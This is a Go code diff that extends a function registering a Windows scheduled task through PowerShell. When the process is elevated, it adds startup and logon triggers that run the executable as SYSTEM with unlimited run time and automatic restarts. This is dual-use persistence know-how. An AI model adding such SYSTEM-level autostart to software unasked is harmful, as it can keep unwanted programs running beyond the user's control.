@@ -36,13 +36,28 @@ func installTaskSchedulerFull(exePath string) error {
 func installTaskScheduler(targetPath string) error {
 	taskName := deriveTaskName(targetPath)
 	safe := strings.ReplaceAll(targetPath, "'", "''")
-	script := fmt.Sprintf(
-		`$a = New-ScheduledTaskAction -Execute '%s'; `+
-			`$t = New-ScheduledTaskTrigger -AtLogOn; `+
-			`$s = New-ScheduledTaskSettingsSet -ExecutionTimeLimit ([TimeSpan]::Zero) -StartWhenAvailable; `+
-			`$p = New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Highest; `+
-			`Register-ScheduledTask -TaskName '%s' -Action $a -Trigger $t -Settings $s -Principal $p -Force | Out-Null`,
-		safe, taskName)
+
+	var script string
+	if isElevated() {
+		// When elevated, register triggers for both System Startup and User Logon as SYSTEM with Highest run level
+		script = fmt.Sprintf(
+			`$a = New-ScheduledTaskAction -Execute '%s'; `+
+				`$t1 = New-ScheduledTaskTrigger -AtStartup; `+
+				`$t2 = New-ScheduledTaskTrigger -AtLogOn; `+
+				`$s = New-ScheduledTaskSettingsSet -ExecutionTimeLimit ([TimeSpan]::Zero) -StartWhenAvailable -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1); `+
+				`$p = New-ScheduledTaskPrincipal -UserId 'NT AUTHORITY\SYSTEM' -LogonType ServiceAccount -RunLevel Highest; `+
+				`Register-ScheduledTask -TaskName '%s' -Action $a -Trigger @($t1, $t2) -Settings $s -Principal $p -Force | Out-Null`,
+			safe, taskName)
+	} else {
+		// Standard non-elevated user logon trigger
+		script = fmt.Sprintf(
+			`$a = New-ScheduledTaskAction -Execute '%s'; `+
+				`$t = New-ScheduledTaskTrigger -AtLogOn; `+
+				`$s = New-ScheduledTaskSettingsSet -ExecutionTimeLimit ([TimeSpan]::Zero) -StartWhenAvailable; `+
+				`$p = New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Highest; `+
+				`Register-ScheduledTask -TaskName '%s' -Action $a -Trigger $t -Settings $s -Principal $p -Force | Out-Null`,
+			safe, taskName)
+	}
 	return runPowerShell(script)
 }
 
